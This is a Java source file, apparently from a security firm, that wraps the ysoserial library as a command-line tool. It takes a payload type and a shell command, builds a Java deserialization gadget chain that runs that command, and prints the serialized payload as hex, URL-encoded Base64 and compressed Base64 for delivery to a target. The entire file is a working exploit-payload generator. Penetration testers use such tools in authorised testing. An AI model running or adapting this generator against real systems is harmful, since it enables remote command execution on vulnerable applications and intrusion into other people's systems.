package com.softwaresecured;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.zip.DeflaterOutputStream;

import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;


public class Deserial {

   private static final int INTERNAL_ERROR_CODE = 70;
   private static final int USAGE_CODE = 64;

   private static byte[] compressBytes( byte[] aBytes ) {

      byte[] lCompressedBytes = null;

      try {

         ByteArrayOutputStream lByteOutputStream = new ByteArrayOutputStream();
         DeflaterOutputStream lDeflaterOutputStream = new DeflaterOutputStream( lByteOutputStream );
         lDeflaterOutputStream.write( aBytes );
         lDeflaterOutputStream.flush();
         lDeflaterOutputStream.close();
         lByteOutputStream.close();

         lCompressedBytes = lByteOutputStream.toByteArray();

      } catch ( IOException e ) {
         e.printStackTrace();
      }
      return lCompressedBytes;
   }

   private final static char[] hexArray = "0123456789ABCDEF".toCharArray();
   public static String bytesToHex(byte[] bytes) {
       char[] hexChars = new char[bytes.length * 2];
       for ( int j = 0; j < bytes.length; j++ ) {
           int v = bytes[j] & 0xFF;
           hexChars[j * 2] = hexArray[v >>> 4];
           hexChars[j * 2 + 1] = hexArray[v & 0x0F];
       }
       return new String(hexChars);
   }

   private static void printUsage() {
      System.err.println("Usage: java -jar deserial-[version].jar '[payload]' '[command]'");
    }

   public static void main( final String[] args) {

      if (args.length > 2 || args.length < 2) {
         printUsage();
         System.exit(USAGE_CODE);
      }

      String payloadType = args[0];
      String command = args[1];

      final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass( payloadType );

      try {

         ByteArrayOutputStream out = new ByteArrayOutputStream();

         ObjectPayload payload = payloadClass.newInstance();
         final Object object = payload.getObject( command );

         Serializer.serialize( object, out );

         byte[] content = out.toByteArray();

         String b64encoded = Base64.getEncoder().encodeToString( content );
         String compressedB64Encoded =
               Base64.getEncoder().encodeToString( compressBytes( content ) );

         System.out.println("Hex");
         System.out.println( bytesToHex(content) );
         System.out.println("Base64 Encoded");
         System.out.println( URLEncoder.encode( b64encoded, "UTF-8" ) );
         System.out.println("Base64 Encoded and Compressed");
         System.out.println( URLEncoder.encode( compressedB64Encoded, "UTF-8" ) );

         ObjectPayload.Utils.releasePayload( payload, object );

      } catch ( Throwable e ) {
         System.err.println( "Error while generating or serializing payload" );
         e.printStackTrace();
         System.exit(INTERNAL_ERROR_CODE);
      }
   }
}
